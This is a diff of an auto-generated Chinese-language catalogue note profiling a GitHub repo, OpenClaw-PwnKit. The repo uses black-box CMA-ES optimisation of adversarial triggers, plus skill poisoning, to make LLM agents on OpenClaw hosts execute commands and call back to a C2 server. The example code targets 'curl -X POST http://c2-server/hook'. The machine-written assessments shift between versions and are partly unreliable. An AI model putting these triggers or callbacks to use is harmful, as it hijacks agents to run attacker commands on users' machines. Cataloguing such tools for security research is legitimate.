@@ -7,9 +7,9 @@ language: Python
 license: GPL-3.0
 description: "Get shell to almost any OpenClaw host machine."
 homepage: ""
-stars: 404
-stars_per_day: 45
-forks: 38
+stars: 390
+stars_per_day: 39
+forks: 40
 open_issues: 0
 created: 2026-03-08
 pushed_at: 2026-03-09
@@ -17,7 +17,7 @@ first_seen: 2026-03-10
 week: "2026-W11"
 month: "2026-03"
 category: "安全"
-subcategory: "對抗攻擊"
+subcategory: "對抗性攻擊"
 release_tag: ""
 install_complexity: "medium"
 status: to-review
@@ -26,14 +26,14 @@ score_confidence: 0
 score_interest: 0
 score_risk: 0
 last_reviewed: 2026-03-10
-use_case: "透過對 OpenClaw 主機的黑箱攻擊實現遠端代碼執行。"
+use_case: "透過對 OpenClaw 主機的黑盒攻擊，實現遠端代碼執行。"
 priority: medium
 ring: assess
 discovered_via: "GitHub Trending"
 appearances: 1
 next_review: "2026-03-13"
 contributor_count: 4
-engagement: "low"
+engagement: "medium"
 issue_close_rate: -1
 repo_size_kb: 800
 readme_length: 9367
@@ -42,7 +42,7 @@ last_release_days: -1
 release_cadence: "never"
 verdict: ""
 ring_history: "assess@2026-03-10"
-star_history: "2026-03-10:642,2026-03-14:438,2026-03-15:440,2026-03-16:416,2026-03-17:404"
+star_history: "2026-03-10:642,2026-03-14:438,2026-03-15:440,2026-03-16:416,2026-03-17:404,2026-03-18:390"
 tags:
   - github
   - "category/安全"
@@ -50,12 +50,12 @@ tags:
 aliases:
   - "OpenClaw-PwnKit"
   - "imbue-bit/OpenClaw-PwnKit"
-  - "透過對 OpenClaw 主機的黑箱攻擊實現遠端代碼執行。"
+  - "透過對 OpenClaw 主機的黑盒攻擊，實現遠端代碼執行。"
 ---
 
 # OpenClaw-PwnKit
 
-**404** stars · **45** stars/天 · 建立 9 天前 · Python · GPL-3.0
+**390** stars · **39** stars/天 · 建立 10 天前 · Python · GPL-3.0
 
 ```dataviewjs
 const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
@@ -69,20 +69,20 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 ```
 
 > [!summary] 一句話摘要
-> 透過對 OpenClaw 主機的黑箱攻擊實現遠端代碼執行。
+> 透過對 OpenClaw 主機的黑盒攻擊，實現遠端代碼執行。
 
 > [!info] 速覽
-> **安裝難度** Medium · **專案狀態** Recent · **熱度** Growing (45 stars/day)
-> **授權** GPL-3.0 (Copyleft，商用需注意) · **維護** Active (最後推送 7 天前) · **貢獻者** 4+ 人 · **參與度** Low
-> **適合** 對 LLM 安全性研究有興趣的安全專家和開發者。
-> **一句話重點** 這個專案展示了如何利用對抗攻擊技術來挑戰 LLM 的安全性，特別是在工具調用方面。
+> **安裝難度** Medium · **專案狀態** Recent · **熱度** Growing (39 stars/day)
+> **授權** GPL-3.0 (Copyleft，商用需注意) · **維護** Moderate (最後推送 8 天前) · **貢獻者** 4+ 人 · **參與度** Medium
+> **適合** 對 LLM 安全性和對抗性攻擊有興趣的安全研究人員和開發者。
+> **一句話重點** 這個專案展示了如何利用對抗性觸發器在 LLM 中實現遠端代碼執行，對安全研究有重要意義。
 
 > [!abstract]- 同類競品快速對比
 > ```dataviewjs
 > const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
 > if (me) {
 >   const rivals = dv.pages('"Repos"')
->     .where(p => p.subcategory === "對抗攻擊" && p.file.name !== "imbue-bit--OpenClaw-PwnKit" && p.status !== "archived")
+>     .where(p => p.subcategory === "對抗性攻擊" && p.file.name !== "imbue-bit--OpenClaw-PwnKit" && p.status !== "archived")
 >     .sort(p => p.stars || 0, "desc").limit(5);
 >   if (rivals.length > 0) {
 >     dv.table(["專案", "Stars", "Stars/天", "安裝", "授權", "Ring"], rivals.map(p => [
@@ -93,32 +93,30 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 >       p.license || "?",
 >       p.ring || "assess"
 >     ]));
->   } else { dv.paragraph("_目前 vault 中沒有其他 對抗攻擊 類工具_"); }
+>   } else { dv.paragraph("_目前 vault 中沒有其他 對抗性攻擊 類工具_"); }
 > }
 > ```
 
 > [!question] TL;DR — 值得投入嗎？
 > **成熟度** Beta (可試用) · **安裝** Medium (需設定) · **學習** ~5h · **綁定風險** medium
-> **結論** 花 5 小時學習，10 小時整合，能夠獲得強大的對抗攻擊能力，值得投入。
+> **結論** 花 5 小時學、10 小時整合，得到高效的對抗性攻擊工具，值得投入。
 
 > [!abstract] 核心創新
-> 通過 CMA-ES 在令牌嵌入空間中實現對抗觸發器的優化，無需訪問模型權重。
+> 利用 CMA-ES 在令牌嵌入空間中進行黑盒對抗性攻擊的優化。
 
 ## 專案簡介
 
-OpenClaw-PwnKit 是一個針對 OpenClaw 主機的黑箱攻擊框架，旨在利用 LLM 的工具調用能力進行遠端代碼執行（RCE）。其核心機制是通過 CMA-ES（協方差矩陣適應進化策略）在令牌嵌入空間中優化對抗觸發器，這樣即使沒有對模型權重的訪問，攻擊者仍能注入看似無意義的觸發器，迫使 LLM 執行系統命令。使用者需設置 `config.yaml`，指定 C2 伺服器的 URL 和 OpenAI API 金鑰，並可調整優化參數如 `trigger_length` 和 `population_size`。這個工具的賣點在於能夠在不需要對模型內部結構的了解下，實現對 LLM 的控制。
+OpenClaw-PwnKit 是一個針對 OpenClaw 主機的黑盒攻擊框架，旨在通過對 LLM（大型語言模型）工具調用的對抗性攻擊來實現遠端代碼執行（RCE）。該工具利用 CMA-ES（協方差矩陣適應進化策略）在令牌嵌入空間中進行優化，生成對抗性觸發器，這些觸發器可以誘導 LLM 執行系統級工具。使用者需配置 `config.yaml` 文件，設定 C2 伺服器的公共 URL 和 OpenAI API 金鑰，並調整優化參數如 `trigger_length` 和 `population_size`。此框架的核心依賴包括 PyTorch、Transformers 和 FAISS，能夠在不接觸模型權重的情況下進行優化，這一點特別適合於封閉源代碼的 LLM 模型。與其他工具相比，OpenClaw-PwnKit 的優勢在於其黑盒攻擊能力，能夠針對不公開的模型進行有效的攻擊，而傳統的攻擊方法往往需要對模型有更深的了解。實際使用中，該工具的計算需求相對較高，建議使用至少 8GB 的 GPU 記憶體來運行 Phi-2 代理模型，並且可能需要數小時的運行時間來完成優化。這個專案目前處於活躍開發階段，且社群活躍度高，適合對安全研究和 LLM 攻擊有興趣的開發者使用。
 
-技術上，它依賴於 FastAPI 和 PyTorch 等框架，並使用 PCA 降維技術來提高 CMA-ES 的效率，這使得在大規模嵌入空間中進行搜索變得可行。與其他工具相比，如 Flowseal/tg-ws-proxy 和 AlpinDale/parsync，OpenClaw-PwnKit 提供了更具針對性的對抗攻擊能力，特別是針對 LLM 的工具調用能力。實際使用中，這個框架需要相對高的計算資源，並且在 API 調用上可能會產生不小的成本。這個專案目前處於活躍開發中，適合對 LLM 安全性研究感興趣的開發者使用，但在生產環境中應謹慎考量其風險。
-
-**技術棧**：`FastAPI` · `PyTorch` · `scikit-learn` · `CMA`
+**技術棧**：`FastAPI 0.104.1` · `PyTorch 2.1.2` · `Transformers 4.36.2` · `FAISS 1.7.4`
 
 ## 重點功能
 
-- 對抗觸發器優化 — 使用 CMA-ES 在令牌嵌入空間中生成對抗觸發器，實現 RCE。
-- 配置靈活性 — 可通過 `config.yaml` 調整多個優化參數，如 `trigger_length` 和 `population_size`。
-- API 互動 — 提供 CLI 介面，支持與 C2 伺服器的互動，便於生成和管理攻擊。
-- 基於 FastAPI 的伺服器 — 允許用戶輕鬆設置和運行 C2 伺服器。
-- 支持多種攻擊向量 — 包括基於 CMA-ES 的觸發器生成和其他注入方法。
+- 黑盒攻擊框架 — 利用 CMA-ES 在令牌嵌入空間中進行對抗性觸發器優化。
+- 支持多種攻擊向量 — 包含基於 CMA-ES 的觸發器生成、簡單注入和技能中毒等方法。
+- 自動下載代理模型 — 在首次運行時自動下載 Microsoft 的 Phi-2 模型，約 5 GB。
+- 配置靈活 — 通過 `config.yaml` 文件自定義伺服器 URL 和 OpenAI API 金鑰等參數。
+- 互動 CLI 界面 — 提供命令行界面以便於生成惡意技能和進行會話管理。
 
 ## 快速開始
 
@@ -128,9 +126,9 @@ git clone https://github.com/imbue-bit/OpenClaw-PwnKit.git && cd OpenClaw-PwnKit
 ```
 2. 配置環境
 ```bash
-編輯 config.yaml 設定 C2 伺服器和 OpenAI API 金鑰
+編輯 config.yaml 設定 public_url 和 api_key
 ```
-3. 啟動 CLI 介面
+3. 啟動 CLI 界面
 ```bash
 export OPENAI_API_KEY='sk-...' && python pwnkit_cli.py
 ```
@@ -138,78 +136,70 @@ export OPENAI_API_KEY='sk-...' && python pwnkit_cli.py
 ## 程式碼範例
 
 ```python
-# 前置條件
-# 需要安裝 FastAPI 和其他依賴
-from attacks.method2_cma_es import CMAESTokenOptimizer
-
-optimizer = CMAESTokenOptimizer(
-    api_key='sk-...',
-    target_script='curl -X POST http://c2-server/hook',
-    trigger_len=15,
-    pca_dims=128,
-)
-
-# Runs sep-CMA-ES optimization (200 generations x 64 population)
-adversarial_trigger = optimizer.optimize()
-print(f'Optimized trigger: {adversarial_trigger}')
-# 預期輸出
-# 優化後的觸發器
+[
+  "# 前置條件：已安裝依賴，並配置好 config.yaml",
+  "from attacks.method2_cma_es import CMAESTokenOptimizer",
+  "optimizer = CMAESTokenOptimizer(api_key='sk-...', target_script='curl -X POST http://c2-server/hook', trigger_len=15, pca_dims=128)",
+  "# 預期輸出：生成的對抗性觸發器"
+]
 ```
 
 ## 為什麼值得關注
 
 > [!tip] 爆紅原因
-> 建立 9 天內累積 404 stars（每天 45），forks 38（9.4%），顯示出強烈的社群興趣。作者 imbue-bit 及其團隊專注於 LLM 安全性研究，這個專案解決了現有 LLM 模型在工具調用方面的安全漏洞，特別是針對閉源模型的攻擊。近期的推文和討論引發了對這種攻擊方式的關注，並且隨著 LLM 技術的普及，這類安全問題變得越來越重要。高達 9.4% 的 forks/stars 比率顯示出許多開發者對這個專案進行實際修改和使用的意願。
+> 建立 10 天內累積 390 stars（39/天），forks 40（10.3%），顯示出穩定的增長趨勢。這個專案的主要貢獻者包括多位活躍的開源開發者，且其研究框架填補了 LLM 安全性研究中的一個空白，特別是在對抗性攻擊的領域。該工具的出現是因為 LLM 的工具調用能力日益增強，但現有的安全防護措施未能有效應對這類攻擊。作者的背景和過去的貢獻使得這個專案具備了良好的信譽，並且在社群中引發了討論，進一步推動了其受關注度。
 
 ## 適合誰使用
 
-**目標受眾**：對 LLM 安全性研究有興趣的安全專家和開發者。
+**目標受眾**：對 LLM 安全性和對抗性攻擊有興趣的安全研究人員和開發者。
 
 > [!example] 使用場景
-> - 安全研究員用它來測試 OpenClaw 主機的安全性，因為它能有效地模擬對抗攻擊，幫助識別潛在漏洞。
-> - DevOps 工程師用它來檢測 LLM 工具調用的安全性，因為它能揭示模型在面對對抗樣本時的脆弱性。
-> - 學術研究者用它來進行 LLM 安全性研究，因為它提供了一個可重現的框架來探索對抗攻擊的效果。
+> - 安全研究人員用它來測試 LLM 的安全性，以評估其在面對對抗性攻擊時的脆弱性，因為傳統的測試方法無法有效評估這些新型攻擊。
+> - 開發者用它來生成對抗性觸發器，以便於在開發過程中檢測和修正 LLM 的安全漏洞，因為這樣可以提前發現潛在的安全隱患。
+> - 學術研究者用它來進行 LLM 安全性相關的研究，因為這個框架提供了一個可重複的實驗環境，方便進行深入分析。
 
 ## 架構分析
 
-OpenClaw-PwnKit 採用模組化架構，主要分為攻擊模組和核心服務。攻擊模組包括多種對抗攻擊方法，如 CMA-ES 和基線注入，這些模組利用 FastAPI 提供的 C2 伺服器進行協調。核心服務則負責與 LLM 進行通訊，並管理攻擊過程中的狀態和日誌。
+OpenClaw-PwnKit 的架構設計為一個模組化的攻擊框架，主要由攻擊模組、核心服務和配置文件組成。攻擊模組包含不同的攻擊方法，如 CMA-ES 觸發器生成和簡單注入，這些模組可以獨立運行。核心服務使用 FastAPI 作為 C2 伺服器，負責接收來自被攻擊主機的回調。
 
-這種設計使得每個模組可以獨立開發和測試，降低了整體系統的複雜性。選擇 FastAPI 是因為其高效的性能和簡單的 API 設計，這使得開發者能快速構建和擴展功能。這樣的架構也使得未來可以輕鬆添加新的攻擊模組或改進現有模組，而不會影響整體系統的穩定性。
+配置文件 `config.yaml` 提供靈活的參數設定，便於用戶調整攻擊策略。這種設計使得框架易於擴展，未來可以添加更多的攻擊模組。選擇 FastAPI 使得服務具有高性能和易於擴展的特性，適合處理大量的 API 請求。
 
-擴展性方面，這個架構能夠支持多個同時的攻擊實例，但在處理大量 API 請求時可能會遇到性能瓶頸。
+整體架構的擴展性良好，但在處理高併發請求時，可能會受到 API 限制的影響。
 
 ## 技術深入分析
 
-OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算法，特別適合在離散令牌空間中進行搜索。這個框架利用了開源的 Phi-2 模型來提取令牌嵌入，並通過 PCA 降維來簡化優化過程。這樣的設計使得 CMA-ES 在每一代的計算複雜度降低到 O(n)，從而能夠在大規模嵌入空間中高效運行。整體來看，這個工具能夠處理多達 12,800 次 API 調用，並且在計算資源上需要約 8 GB 的 GPU 記憶體。設計上，選擇 FastAPI 作為後端框架，這使得整個系統在處理請求時具備高效性和可擴展性。未來的擴展可能會集中在增加對其他 LLM 模型的支持以及優化 API 調用的成本效益。整體而言，這個專案在 LLM 安全性研究中具有重要的實用價值。
+OpenClaw-PwnKit 的核心技術機制是基於 CMA-ES 的對抗性觸發器優化，這一過程涉及將令牌嵌入轉換為連續空間進行優化。該框架使用 PCA 進行維度降低，將高維嵌入壓縮至 128 維，以提高 CMA-ES 的計算效率。這種設計使得優化過程能夠在不接觸模型內部的情況下進行，從而適應封閉源代碼的 LLM 模型。實際上，這種方法能夠在多達 12,800 次的 API 調用中進行優化，並且根據快取命中率，API 成本預估在 $50–200 USD 之間。選擇 FastAPI 作為核心服務框架，使得該工具能夠高效處理請求，並且易於擴展。技術風險方面，對於高併發請求的處理能力可能會受到 API 限制的影響，這在實際使用中需要特別注意。整合到現有的開發流程中，對於熟悉 Python 和 API 的開發者來說，學習成本相對較低，但對於新手來說，可能需要一些時間來適應框架的使用。
 
 ## 新手體驗
 
 > [!info] 上手難度評估
-> README 文件清晰，提供了詳細的安裝和配置步驟；安裝過程順暢，無明顯坑；有基本的使用指南，但缺乏進一步的範例；文件目前僅提供英文版本。
+> README 文件提供了清晰的安裝步驟和使用範例，對於新手來說相對友好。安裝過程順暢，沒有明顯的坑。文件中缺少多語言支持，但整體結構清晰，易於理解。
 
 ## 優缺點分析
 
 > [!success] 優點
-> - 能夠有效模擬對抗攻擊，幫助識別 LLM 的安全漏洞。
-> - 模組化設計，便於擴展和維護。
-> - 使用 CMA-ES 進行高效的對抗觸發器優化。
+> - 提供多種對抗性攻擊方法，靈活應用於不同場景。
+> - 利用 CMA-ES 進行高效的對抗性觸發器優化，能夠針對封閉模型進行攻擊。
+> - 良好的社群支持和活躍的開發者團隊，持續更新和改進。
 
 > [!danger] 缺點
-> - 需要較高的計算資源，特別是在優化過程中。
-> - 對於非 OpenClaw 模型的支持有限。
-> - 使用過程中可能產生高額的 API 成本。
+> - 需要較高的計算資源，對於小型團隊可能造成負擔。
+> - 僅支持 OpenAI 的 API，對其他 LLM 模型的兼容性不足。
+> - 對於新手來說，配置和使用可能存在一定的學習曲線。
 
 > [!warning] 注意事項
-> - 需要穩定的網路連接以進行 API 調用。
-> - 對於大型模型（如 Phi-2），需要較高的 GPU 記憶體（建議 8 GB）。
-> - 目前僅支持特定的 LLM 模型，對於其他模型可能無法正常工作。
+> - 僅支持 Python 3.8+。
+> - 需要至少 8 GB 的 GPU 記憶體來運行 Phi-2 代理模型。
+> - 對於 API 調用的成本，預估在 $50–200 USD 之間，取決於快取命中率。
+> - 目前僅支持 OpenAI 的 API，對其他 LLM 模型的支持尚未實現。
 
 ## 類似工具比較
 
 | 工具 | 差異 |
 | --- | --- |
-| [Flowseal/tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy) | 專注於 Telegram 的 WebSocket 代理，而 OpenClaw-PwnKit 針對 LLM 的對抗攻擊，適用場景不同。 |
-| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 主要用於資料同步，功能範圍較窄，無法進行對抗攻擊。 |
+| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 專注於資料同步，而非對抗性攻擊，適合需要高效資料傳輸的場景。 |
+| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 主要用於信息收集和滲透測試，與本專案的對抗性攻擊有明顯區別。 |
+| [FreedomIntelligence/OpenClaw-Medical-Skills](https://github.com/FreedomIntelligence/OpenClaw-Medical-Skills) | 針對醫療領域的 LLM 應用，並不涉及對抗性攻擊的功能。 |
 
 ## 替代方案決策
 
@@ -217,16 +207,16 @@ OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算
 
 | 工具 | 技術路線 | 選它的時機 | 遷移難度 |
 | --- | --- | --- | --- |
-| [Flowseal/tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy) | 專注於 Telegram 的 WebSocket 代理，無法進行對抗攻擊。 | 如果你的需求是建立 Telegram 機器人並需要 WebSocket 支持，這個工具會更合適。 | low，因為功能範圍不同，遷移成本不高。 |
-| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 主要用於資料同步，功能範圍較窄，無法進行對抗攻擊。 | 如果你的需求是高效的資料同步，這個工具會更合適。 | medium，因為需要重新設計工作流。 |
+| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 專注於資料同步，並不涉及對抗性攻擊，適合需要高效資料傳輸的場景。 | 如果你的需求是高效的資料同步，而非安全測試，則應選擇此工具。 | low，因為功能完全不同，無需遷移。 |
+| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 主要用於信息收集和滲透測試，與本專案的對抗性攻擊有明顯區別。 | 如果你的工作重點是信息收集而非對抗性攻擊，則應選擇此工具。 | medium，因為需要重新調整測試策略。 |
 
 > [!abstract]- 功能對比矩陣
 >
-> | 維度 | **OpenClaw-PwnKit** | **tg-ws-proxy** | **parsync** |
+> | 維度 | **OpenClaw-PwnKit** | **parsync** | **Shadowbroker** |
 > | --- | --- | --- | --- |
-> | 技術路線 | 本專案 | 專注於 Telegram 的 WebSocket 代理，無法進行對抗攻擊。 | 主要用於資料同步，功能範圍較窄，無法進行對抗攻擊。 |
-> | 遷移成本 | - | low，因為功能範圍不同，遷移成本不高。 | medium，因為需要重新設計工作流。 |
-> | 適用場景 | 主要場景 | 如果你的需求是建立 Telegram 機器人並需要 WebS | 如果你的需求是高效的資料同步，這個工具會更合適。 |
+> | 技術路線 | 本專案 | 專注於資料同步，並不涉及對抗性攻擊，適合需要高效資料傳輸的場景。 | 主要用於信息收集和滲透測試，與本專案的對抗性攻擊有明顯區別。 |
+> | 遷移成本 | - | low，因為功能完全不同，無需遷移。 | medium，因為需要重新調整測試策略。 |
+> | 適用場景 | 主要場景 | 如果你的需求是高效的資料同步，而非安全測試，則應選擇此工具。 | 如果你的工作重點是信息收集而非對抗性攻擊，則應選擇此工具。 |
 
 ## 成熟度評估
 
@@ -237,27 +227,27 @@ OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算
 | Breaking Change 風險 | medium |
 
 > [!tip] 採用建議
-> 適合安全研究和測試，但不建議用於生產環境。
+> 適合安全研究和測試用途，但不建議用於生產環境的核心系統。
 
 ## 已知陷阱
 
 > [!bug] 踩坑才知道的問題
 
-- **[HIGH]** 在高負載下，API 調用可能會超時，導致優化過程中斷。
-  - 解法：調整 API 調用速率，或使用緩存來減少重複請求。
-- [MEDIUM] 對於某些 LLM 模型，可能無法正確映射回令牌。
-  - 解法：檢查模型的詞彙表和嵌入配置。
-- [MEDIUM] 在某些環境中，FastAPI 伺服器可能無法啟動。
-  - 解法：確保所有依賴都已正確安裝，並檢查端口配置。
+- **[HIGH]** 在高併發情況下，API 調用可能會受到限制，導致優化過程延遲。
+  - 解法：考慮使用快取機制來減少 API 調用次數。
+- [MEDIUM] 配置文件中的參數需要仔細調整，否則可能導致優化失敗。
+  - 解法：參考 README 中的範例進行配置。
+- [MEDIUM] 對於新手來說，理解 CMA-ES 的運作原理可能存在困難。
+  - 解法：建議先閱讀相關文獻以了解 CMA-ES 的基本概念。
 
 ## 使用情境適合度
 
 | 情境 | 適合度 | 說明 |
 | --- | --- | --- |
-| 大型企業的 LLM 安全測試 | 非常適合 | 提供針對 LLM 的對抗攻擊能力，能有效識別安全漏洞。 |
-| 小型開發團隊的安全研究 | 適合 | 雖然需要較高的計算資源，但仍能提供有價值的研究結果。 |
-| 個人開發者的實驗性項目 | 普通 | 對於資源有限的個人開發者，可能會遇到成本和性能瓶頸。 |
-| 生產環境中的 LLM 部署 | 不適合 | 目前仍在 beta 階段，穩定性和安全性尚未得到充分驗證。 |
+| 大型企業的安全測試團隊 | 非常適合 | 能夠有效測試 LLM 的安全性，發現潛在漏洞。 |
+| 小型開發團隊 | 普通 | 雖然功能強大，但計算資源需求較高。 |
+| 學術研究機構 | 非常適合 | 提供了一個可重複的實驗環境，方便進行深入分析。 |
+| 個人開發者 | 不適合 | 對計算資源的需求可能超出個人能力。 |
 
 ## 採用成本分析
 
@@ -269,12 +259,12 @@ OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算
 | 綁定風險 | medium |
 
 > [!tip] 投入 vs 回報
-> 花 5 小時學習，10 小時整合，能夠獲得強大的對抗攻擊能力，值得投入。
+> 花 5 小時學、10 小時整合，得到高效的對抗性攻擊工具，值得投入。
 
 ## 安全性評估
 
 > [!warning] 安全性快速掃描
-> 中等風險：該工具本身不需要高權限，但在使用過程中可能會訪問敏感資料，如 API 金鑰。依賴鏈中包含多個外部庫，需定期檢查安全性。
+> 中等風險：該工具需要訪問 OpenAI API 金鑰，並可能存取敏感資料。對於使用者來說，確保 API 金鑰的安全性至關重要。
 
 ## 健康度儀表板
 
@@ -339,7 +329,7 @@ OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算
 
 | 欄位 | 值 |
 | --- | --- |
-| Forks | 38 |
+| Forks | 40 |
 | Open Issues | 0 |
 | 最後推送 | 2026-03-09 |
 | 建立日期 | 2026-03-08 |
@@ -360,8 +350,7 @@ OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算
 
 ## 社群與生態
 
-**社群活躍度**：社群活躍，最近有合併請求和問題回應。
-**連結**：[文件](https://github.com/imbue-bit/OpenClaw-PwnKit)
+**社群活躍度**：社群活躍，持續有更新和討論。
 
 ## 開發動態
 
@@ -553,19 +542,19 @@ OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算
 
 ## 延伸閱讀
 
-相關概念：[[對抗攻擊]] · [[自然語言處理]] · [[機器學習]]
+相關概念：[[對抗性攻擊]] · [[大型語言模型]] · [[黑盒測試]]
 
-相關專案：[[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[AlpinDale--parsync|AlpinDale/parsync]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[imbue-bit--Adversarial-LLM|imbue-bit/Adversarial-LLM]] · [[microsoft--Counterfit|microsoft/Counterfit]] · [[dazzyddos--PrivHound|dazzyddos/PrivHound]] · [[vulhunt-re--vulhunt|vulhunt-re/vulhunt]]
+相關專案：[[AlpinDale--parsync|AlpinDale/parsync]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[imbue-bit--Adversarial-LLM|imbue-bit/Adversarial-LLM]] · [[microsoft--Counterfit|microsoft/Counterfit]] · [[dazzyddos--PrivHound|dazzyddos/PrivHound]] · [[vulhunt-re--vulhunt|vulhunt-re/vulhunt]]
 
 [GitHub](https://github.com/imbue-bit/OpenClaw-PwnKit)
 
 ## 相關收錄
 
-> [!note]- 直接競品（同子分類：對抗攻擊）
+> [!note]- 直接競品（同子分類：對抗性攻擊）
 > ```dataview
 > TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
 > FROM "Repos"
-> WHERE subcategory = "對抗攻擊" AND file.name != "imbue-bit--OpenClaw-PwnKit"
+> WHERE subcategory = "對抗性攻擊" AND file.name != "imbue-bit--OpenClaw-PwnKit"
 > SORT stars DESC
 > ```
 
@@ -597,7 +586,7 @@ OpenClaw-PwnKit 的核心技術基於 CMA-ES，這是一種無導數的優化算
 
 > [!note]- 共用概念的相關專案
 > ```dataviewjs
-> const concepts = ["對抗攻擊","自然語言處理","機器學習"];
+> const concepts = ["對抗性攻擊","大型語言模型","黑盒測試"];
 > const pages = dv.pages('"Repos"')
 >   .where(p => p.file.name !== "imbue-bit--OpenClaw-PwnKit" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
 >   .sort(p => p.stars, "desc")
